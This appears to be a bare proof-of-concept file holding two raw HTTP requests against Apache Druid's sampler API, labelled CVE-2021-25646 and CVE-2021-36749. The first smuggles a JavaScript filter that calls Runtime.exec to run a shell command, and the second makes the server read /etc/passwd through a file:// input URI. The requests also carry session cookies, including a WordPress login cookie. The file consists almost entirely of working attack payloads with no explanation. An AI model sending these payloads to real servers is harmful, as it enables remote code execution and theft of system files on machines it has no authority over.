# CVE-2021-25646

<pre>
POST /druid/indexer/v1/sampler HTTP/1.1
Host: 192.168.1.3:8888
Content-Length: 591
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.232 Whale/2.10.124.26 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.3:8888
Referer: http://192.168.1.3:8888/unified-console.html
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=200c35f831f1399dac0d25dc01e005cb; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e63617fb709aee34babc557e8a1e8f07=0ppr2s%7C1634781054%7ComN8NbaYZx7mX3wLRSL9twQC4gvGtUd7GCTRRU0v0jR%7Cbb08b324b8de1d190bd434deb07224f10bf123126c9a70ffcc51d708dcdb649d; wp-settings-time-1=1634608873
Connection: close

{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript", "function":"function(value){return java.lang.Runtime.getRuntime().exec('touch /tmp/hacked!!.txt')}", "dimension":"added"}}}},"samplerConfig":{"numRows":500,"cacheKey":"73a90acaae2b1ccc0e969709665bc62f"}}
</pre>

# CVE-2021-36749
<pre>
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: 192.168.1.3:8888
Content-Length: 423
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.232 Whale/2.10.124.26 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.1.3:8888
Referer: http://192.168.1.3:8888/unified-console.html
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: wp-settings-time-1=1634608873
Connection: close

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":["file:///etc/passwd"]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
<pre>